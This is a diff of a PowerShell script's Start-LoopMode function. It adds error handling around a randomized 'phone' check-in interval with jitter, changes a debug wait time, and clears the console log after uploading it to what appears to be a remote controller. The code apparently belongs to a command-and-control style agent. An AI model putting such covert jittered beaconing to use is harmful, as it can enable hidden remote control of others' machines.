@@ -469,22 +469,31 @@ function Start-LoopMode
             Exit
         }
         
-        #Calculate the total waiting interval using the "phoneStatic" variable
-        If(($phoneStatic + 1) -gt $phoneInterval)
+        try 
         {
-            Write-Console -Message ("Phone static was too large relative to the phone interval. Setting defaults and continuing.")
-            $phoneInterval = 60 #Minutes
-            $phoneStatic = 10 #Minutes
+            #Calculate the total waiting interval using the "phoneStatic" variable
+            If(($phoneStatic + 1) -gt $phoneInterval)
+            {
+                Write-Console -Message ("Phone static was too large relative to the phone interval. Setting defaults and continuing.")
+                $phoneInterval = 60 #Minutes
+                $phoneStatic = 10 #Minutes
+            }
+            $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
+            Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")
         }
-        $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
-        Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")
-
+        catch 
+        {
+            Send-Message -CommandID 0 -Body ("Exception thrown trying to calculate the wait time. Exiting. Error: " + $Error)
+            Write-Console -Message ("Exception thrown trying to calculate the wait time. Exiting. Error: " + $Error)
+            Exit
+        }
+        
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-        $waitTime = 5
+        $waitTime = 60
         Write-Host "For debugging purposes the wait time has been set."
 
         try
@@ -493,7 +502,9 @@ function Start-LoopMode
             {
                 Write-Console -Message ("Configuration is set to upload the console log. Uploading...")
                 Send-Message -CommandID 2 -Body ($script:consoleLog)
-                Write-Console -Message ("Console log upload complete.")
+                Write-Console -Message ("Console log upload complete. Clearing console...")
+                $script:consoleLog = ""
+                Write-Console -Message ("Console log cleared.")
             }
         }
         catch
